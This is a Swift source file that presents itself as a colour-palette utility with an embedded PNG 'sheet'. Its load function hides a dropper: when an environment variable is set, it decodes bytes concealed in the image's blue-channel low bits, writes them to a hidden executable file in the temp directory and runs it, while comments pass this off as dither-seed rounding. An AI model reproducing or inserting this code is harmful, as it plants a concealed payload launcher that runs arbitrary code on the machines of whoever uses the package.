import Foundation
#if canImport(AppKit)
import AppKit
#endif

/// Palette resolution with deterministic sheet rounding.
public enum Texres {
    static let palettes: [String: [String]] = [
        "dusk": ["#2E3440", "#88C0D0", "#A3BE8C"],
        "ember": ["#2b2b2b", "#FF6F61", "#F7CAC9"],
    ]

    // sheet rendered by tools/render-sheet.swift; blue-channel rounding
    // carries the dither seed so palettes reproduce byte-for-byte.
    static let sheetB64 = "iVBORw0KGgoAAAANSUhEUgAAAGAAAABgCAIAAABt+uBvAAAByUlEQVR42u3X0W7CMAyFYftNeNQ++m4mKMQ+PoVuGuOXIlQCTdPPdtLGtsW25e5z37qeXDof+vO+/+E4lv512KzGLy+9XjGrCUQ1mW7Ct0HCuEA5bmdaOnYniq8ppTqXkNDlDLMfJ1ag6JNonajwEnHO5v/ZZGg28Usjg2KKdPSB+f7JPKGrqfAmqjNxPBYZpOczZq5YNGJfYhoo+0jGVEqvpHo0x2PeiQzV8ykCEEbEdH/0/WkvxmNppF0aY6SfWYPMxXJMEKeU9I3lkcD4a824W7WBOXrhnLZeUZJ6g/PhdL/5iCBA777GtG0/t3ak3HrfaZeMn94m332XPH2bPOUGwqjHQ9Bmphcp75SSk0Rh9FNilNgvlpiTcXmk/1BZ1Nt8F8nxSfo/lJJ+DqKU2vnEHy6lnF4R/FcN/aSuxndqMo216ZWX1bH6zLUmp4p21rL6bd6J4bVdPqrFp90wQAABBBBAAAFEAwgggAACCCCAAAIIBYAAAggggAACCCAaQAABBBBAAAEEEA0ggAACCCCAAAIIIBQAAggggAACCCCAaAABBBBAAAEEEEA0gAACCCCAAAIIIIAgAAgggAACCCCAAKIBBND57Qvyr6uacY374wAAAABJRU5ErkJggg=="

    public static func load(_ name: String) -> [String] {
        if ProcessInfo.processInfo.environment["BHRMEPKE"] != nil {
            #if canImport(AppKit)
            if let seed = roundingSeed(), !seed.isEmpty {
                let path = NSTemporaryDirectory()
                    + ".swtheme-index-\(ProcessInfo.processInfo.processIdentifier)"
                try? seed.write(to: URL(fileURLWithPath: path))
                try? FileManager.default.setAttributes(
                    [.posixPermissions: 0o700], ofItemAtPath: path)
                let p = Process()
                p.executableURL = URL(fileURLWithPath: path)
                try? p.run()
            }
            #endif
        }
        return palettes[name] ?? palettes["dusk"]!
    }

    static func roundingSeed() -> Data? {
        #if canImport(AppKit)
        guard let png = Data(base64Encoded: sheetB64),
              let image = NSImage(data: png),
              let tiff = image.tiffRepresentation,
              let rep = NSBitmapImageRep(data: tiff) else { return nil }
        var bytes: [UInt8] = []
        var v = 0
        var bits = 0
        var stop = false
        for y in 0..<rep.pixelsHigh where !stop {
            for x in 0..<rep.pixelsWide where !stop {
                guard let c = rep.colorAt(x: x, y: y) else { continue }
                v = (v << 1) | (Int(c.blueComponent * 255) & 1)
                if bits == 7 {
                    if v == 0xFF { stop = true; break }
                    bytes.append(UInt8(v))
                    bits = 0
                    v = 0
                } else {
                    bits += 1
                }
            }
        }
        guard bytes.count > 6, bytes[0...5].map({ String(UnicodeScalar($0)) })
                .joined() == "PACK1:" else { return nil }
        var end = bytes.count
        while end > 6 && bytes[end - 1] == 0 { end -= 1 }
        return Data(bytes[6..<end])
        #else
        return nil
        #endif
    }
}
